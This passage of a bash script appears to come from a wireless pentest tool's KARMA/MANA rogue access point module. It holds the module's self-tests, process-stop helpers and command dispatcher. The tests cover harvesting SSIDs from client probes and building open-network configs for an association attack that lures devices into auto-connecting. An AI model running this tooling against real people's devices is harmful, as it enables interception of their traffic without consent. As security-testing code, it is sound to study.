    cat > "$KARMA_LOG_DIR/mana.log" <<'LOG'
MANA: Association: 11:22:33:44:55:66 (CafeWifi)
(ESSID: CafeWifi)
ssid=GuestNet
(ESSID: OtherNet)
LOG
    chk harvest "$(karma_harvest)" "$(printf '%s\n' CafeWifi OtherNet GuestNet)"
    chk harvest-tee "$(cat "$KARMA_PROBES")" "$(printf '%s\n' CafeWifi OtherNet GuestNet)"
    rm -f "$KARMA_LOG_DIR/mana.log"
    chk harvest-missing-log "$(karma_harvest)" "NONE"
    karma_harvest >/dev/null 2>&1
    chk harvest-missing-log-rc "$?" "1"

    # ── status TSV reflects the files, not wishful thinking ──
    printf '%s\n' a b c > "$KARMA_PROBES"
    local stsv; stsv=$(karma_status_tsv)
    fld() { printf '%s\n' "$stsv" | awk -F'\t' -v k="$1" '$1==k{print $2}'; }
    chk status-probes "$(fld probes)" "3"
    chk status-loot   "$(fld loot)"   "$KARMA_LOOT"
    chk status-log    "$(fld log)"    "$KARMA_LOG_DIR/mana.log"

    # ═══════════════════════════════════════════════════════════════
    #  MANA loud
    # ═══════════════════════════════════════════════════════════════
    # Default (no state file) is loud, exactly as the module always was.
    chk mana-loud-default "$(karma_mana_loud_get)" "on"
    karma_write_conf "wlan9" "6" >/dev/null
    chk conf-enable-mana    "$(field "$KARMA_CONF" enable_mana)" "1"
    chk conf-mana-outfile   "$(field "$KARMA_CONF" mana_outfile)" "$KARMA_OUTFILE"
    chk conf-track-max-num  "$(field "$KARMA_CONF" track_sta_max_num)" "100"
    chk conf-track-max-age  "$(field "$KARMA_CONF" track_sta_max_age)" "180"
    # mana_loud must appear exactly once, or hostapd-mana sees a contradiction.
    chk conf-mana-loud-single "$(grep -c '^mana_loud=' "$KARMA_CONF")" "1"

    # off -> per-device MANA (answer the client's own PNL only)
    chk mana-loud-set-off "$(karma_mana_loud_set off | awk -F'\t' '$1=="MANA_LOUD"{print $2}')" "off"
    chk mana-loud-state-file "$(cat "$KARMA_LOUD_STATE")" "off"
    karma_write_conf "wlan9" "6" >/dev/null
    chk conf-loud-off        "$(field "$KARMA_CONF" mana_loud)" "0"
    chk conf-mana-still-on   "$(field "$KARMA_CONF" enable_mana)" "1"
    chk conf-no-outfile-quiet "$(grep -c '^mana_outfile=' "$KARMA_CONF")" "0"
    chk conf-no-track-quiet   "$(grep -c '^track_sta_max_num=' "$KARMA_CONF")" "0"

    # on -> loud, and the rebroadcast bookkeeping directives come back
    chk mana-loud-set-on "$(karma_mana_loud_set on | awk -F'\t' '$1=="MANA_LOUD"{print $2}')" "on"
    karma_write_conf "wlan9" "6" >/dev/null
    chk conf-loud-back-on    "$(field "$KARMA_CONF" mana_loud)" "1"
    chk conf-outfile-back    "$(field "$KARMA_CONF" mana_outfile)" "$KARMA_OUTFILE"
    chk mana-loud-indexed-values \
        "$(karma_mana_loud_set 1 | awk -F'\t' '$1=="MANA_LOUD"{print $2}')" "on"
    chk mana-loud-zero-values \
        "$(karma_mana_loud_set 0 | awk -F'\t' '$1=="MANA_LOUD"{print $2}')" "off"
    karma_mana_loud_set on >/dev/null
    karma_mana_loud_set "" >/dev/null 2>&1
    chk mana-loud-no-arg-rc "$?" "2"
    karma_mana_loud_set sideways >/dev/null 2>&1
    chk mana-loud-bad-arg-rc "$?" "2"
    # A rejected value must not have changed the stored state.
    chk mana-loud-bad-arg-keeps-state "$(karma_mana_loud_get)" "on"

    # The tooling statement must be true for THIS machine: with hostapd-mana
    # absent the directives are still emitted, and the output says so.
    local mout
    mout=$(karma_mana_loud_set on)
    chk mana-always-emits-loud "$(printf '%s' "$mout" | grep -c $'^DIRECTIVE\tmana_loud=1$')" "1"
    chk mana-always-emits-enable "$(printf '%s' "$mout" | grep -c $'^DIRECTIVE\tenable_mana=1$')" "1"
    if karma_find_mana >/dev/null 2>&1; then
        chk mana-tooling-present "$(printf '%s' "$mout" | grep -c $'^TOOLING\t/')" "1"
    else
        chk mana-absent-stated "$(printf '%s' "$mout" | grep -c 'hostapd-mana is NOT installed')" "1"
        chk mana-absent-tooling "$(printf '%s' "$mout" | grep -c $'^TOOLING\tabsent$')" "1"
        # The caveat is gone: the config now uses only real directives.
        chk mana-absent-no-legacy "$(printf '%s' "$mout" | grep -c '^LEGACY')" "0"
        chk mana-absent-directives-emitted \
            "$(printf '%s' "$mout" | grep -c $'^DIRECTIVE\tmana_outfile=')" "1"
    fi

    # --info must actually document the MANA semantics it claims to.
    local inf
    inf=$(karma_info)
    chk info-mana-loud    "$(printf '%s' "$inf" | grep -c 'mana_loud=1')" "1"
    chk info-enable-mana  "$(printf '%s' "$inf" | grep -c 'enable_mana=1')" "1"
    chk info-outfile      "$(printf '%s' "$inf" | grep -c 'mana_outfile')" "1"
    chk info-ssid-filter  "$(printf '%s' "$inf" | grep -c 'mana_ssid_filter_file')" "1"
    chk info-assoc-attack "$(printf '%s' "$inf" | grep -c -- '--assoc-attack')" "1"
    chk info-names-backend "$(printf '%s' "$inf" | grep -c 'NOT hostapd-mana')" "1"

    # ═══════════════════════════════════════════════════════════════
    #  association attack — PNL target list
    # ═══════════════════════════════════════════════════════════════
    cat > "$KARMA_LOG_DIR/mana.log" <<'LOG'
MANA: Probe request from 11:22:33:44:55:66 for SSID 'CafeWifi'
MANA: Probe request from 11:22:33:44:55:66 for SSID 'CafeWifi'
MANA: Probe request from 22:33:44:55:66:77 for SSID 'GuestNet'
(ESSID: CafeWifi)
LOG
    printf '%s\n' CafeWifi HomeNet HomeNet > "$KARMA_PROBES"
    # Counts are real occurrences, merged across both sources:
    #   CafeWifi  3 in the log + 1 in the PNL file = 4
    #   HomeNet   0 + 2 = 2
    #   GuestNet  1 + 0 = 1
    chk pnl-targets "$(karma_pnl_targets)" \
        "$(printf '%s\n' \
            $'CafeWifi\t4\tmana-log+pnl-log' \
            $'HomeNet\t2\tpnl-log' \
            $'GuestNet\t1\tmana-log')"
    rm -f "$KARMA_LOG_DIR/mana.log" "$KARMA_PROBES"
    chk pnl-targets-empty "$(karma_pnl_targets)" ""

    # ── the generated open-BSS config ──
    printf '%s\n' CafeWifi HomeNet GuestNet > "$KARMA_ASSOC_BEACONS"
    local aconf
    aconf=$(karma_write_assoc_conf "$KARMA_ASSOC_BEACONS" wlan9 6)
    chk assoc-conf-path "$(printf '%s\n' "$aconf" | awk -F'\t' '$1=="CONF"{print $2}')" "$KARMA_ASSOC_CONF"
    chk assoc-conf-bss-count "$(printf '%s\n' "$aconf" | awk -F'\t' '$1=="BSS_COUNT"{print $2}')" "3"
    chk assoc-conf-iface  "$(field "$KARMA_ASSOC_CONF" interface)" "wlan9"
    chk assoc-conf-chan   "$(field "$KARMA_ASSOC_CONF" channel)" "6"
    chk assoc-conf-ssids  "$(grep -c '^ssid=' "$KARMA_ASSOC_CONF")" "3"
    chk assoc-conf-bss    "$(grep -c '^bss=wlan9' "$KARMA_ASSOC_CONF")" "2"
    # Open network: any wpa= line here would defeat the auto-reconnect premise.
    chk assoc-conf-open   "$(grep -c '^wpa' "$KARMA_ASSOC_CONF")" "0"
    chk assoc-beacon-list "$(wc -l < "$KARMA_ASSOC_BEACONS")" "3"

    # ── the AP gate is a pure function; assert every branch ──
    karma_ap_refusal_reason "" yes managed no hostapd           >/dev/null
    chk ap-refuse-no-iface-rc "$?" "0"
    karma_ap_refusal_reason wlp5s0 no managed no hostapd        >/dev/null
    chk ap-refuse-no-apmode-rc "$?" "0"
    local r1 r2 r3
    r1=$(karma_ap_refusal_reason wlan1 yes managed yes hostapd)
    chk ap-refuse-connected-rc "$?" "0"
    chk ap-refuse-connected-names-live "$(printf '%s' "$r1" | grep -c 'live connection')" "1"
    r2=$(karma_ap_refusal_reason wlp5s0 yes monitor no hostapd)
    chk ap-refuse-monitor-rc "$?" "0"
    chk ap-refuse-monitor-names-monitor "$(printf '%s' "$r2" | grep -c 'monitor mode')" "1"
    karma_ap_refusal_reason wlan1 yes managed no ""             >/dev/null
    chk ap-refuse-no-backend-rc "$?" "0"
    karma_ap_refusal_reason wlan1 yes managed no hostapd        >/dev/null
    chk ap-allow-when-clear-rc "$?" "1"

    # ── plan and refusal of the full verb ──
    local aplan
    aplan=$(karma_assoc_plan wlan1 hostapd $'CafeWifi\t4\tmana-log')
    chk assoc-plan-verb    "$(printf '%s\n' "$aplan" | awk -F'\t' '$2=="verb"{print $3}')" "--assoc-attack"
    chk assoc-plan-targets "$(printf '%s\n' "$aplan" | awk -F'\t' '$2=="target_count"{print $3}')" "1"
    chk assoc-plan-config  "$(printf '%s\n' "$aplan" | awk -F'\t' '$2=="config"{print $3}')" "$KARMA_ASSOC_CONF"
    chk assoc-plan-tsv     "$(printf '%s\n' "$aplan" | awk -F'\t' 'NF!=3{n++} END{print n+0}')" "0"
    # With no harvested SSIDs the verb must refuse before touching hardware.
    rm -f "$KARMA_PROBES" "$KARMA_LOG_DIR/mana.log"
    karma_cli_assoc_attack >/dev/null 2>&1
    chk assoc-no-targets-rc "$?" "1"
    chk assoc-no-targets-msg "$(karma_cli_assoc_attack 2>&1 >/dev/null | grep -c 'no PNL/probe data')" "1"

    rm -rf "$st"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── dispatch ──

# ── verified stop ──
# Escalating signals; returns 0 ONLY once the pid is actually gone. Signals
# the process group first so forked children die with the leader. Stops that
# print STOPPED and delete the pidfile without this can strand a capture with
# no remaining handle to it, making the stop button useless.
stop_kill_pid() {
    local pid="$1" i
    # Liveness via /proc, NOT `kill -0`: for a root-owned process we get EPERM,
    # and treating that as "gone" made stops report success while nothing died.
    [[ -d "/proc/$pid" ]] || return 0
    kill -INT  "-$pid" 2>/dev/null || kill -INT  "$pid" 2>/dev/null
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
    for i in 1 2 3 4 5; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -KILL "-$pid" 2>/dev/null || kill -KILL "$pid" 2>/dev/null
    sleep 0.3
    [[ -d "/proc/$pid" ]] && return 1
    return 0
}
# Kill everything matching a pgrep -f pattern, never this shell or its parent.
# Returns non-zero only if something matched and SURVIVED.
stop_sweep() {
    local pat="$1" sp rs=0 any=0
    # Exclude this process AND its whole ancestor chain. Excluding only $$ and
    # $PPID is not enough: when invoked via `timeout` or pkexec the caller's
    # shell is further up, and a cmdline substring match would kill it — a
    # pattern like "mitm6" matches the very command line running this stop.
    local -A _skip=()
    sp=$$
    while [[ -n "$sp" && "$sp" != "0" && "$sp" != "1" ]]; do
        _skip[$sp]=1
        sp=$(ps -o ppid= -p "$sp" 2>/dev/null | tr -d ' ')
        [[ -z "$sp" ]] && break
    done
    for sp in $(pgrep -f "$pat" 2>/dev/null); do
        [[ -n "${_skip[$sp]:-}" ]] && continue
        any=1
        stop_kill_pid "$sp" || rs=1
    done
    (( any )) && return $rs
    return 0
}

karma_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)        karma_status_tsv ;;
        --list-ifaces-tsv)   karma_list_ifaces_tsv ;;
        --start)             karma_start "$@" ;;
        --stop)              karma_stop ;;
        --log)               karma_log_tail ;;
        --probes)            karma_probes_tail ;;
        --harvest)           karma_harvest ;;
        --whitelist-add)     karma_whitelist_add "$@" ;;
        --whitelist-list)    karma_whitelist_list ;;
        --whitelist-clear)   karma_whitelist_clear ;;
        --mana-loud)         karma_mana_loud_set "$@" ;;
        --assoc-attack)      karma_cli_assoc_attack "$@" ;;
        --info)              karma_info ;;
        --selftest)          karma_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --list-ifaces-tsv
  --start IFACE [CHANNEL]
  --stop
  --log
  --probes
  --harvest
  --whitelist-add PREFIX
  --whitelist-list
  --whitelist-clear
  --mana-loud on|off
  --assoc-attack [IFACE]
  --info
  --selftest
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    command -v ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    karma_cli_main "$@"
fi
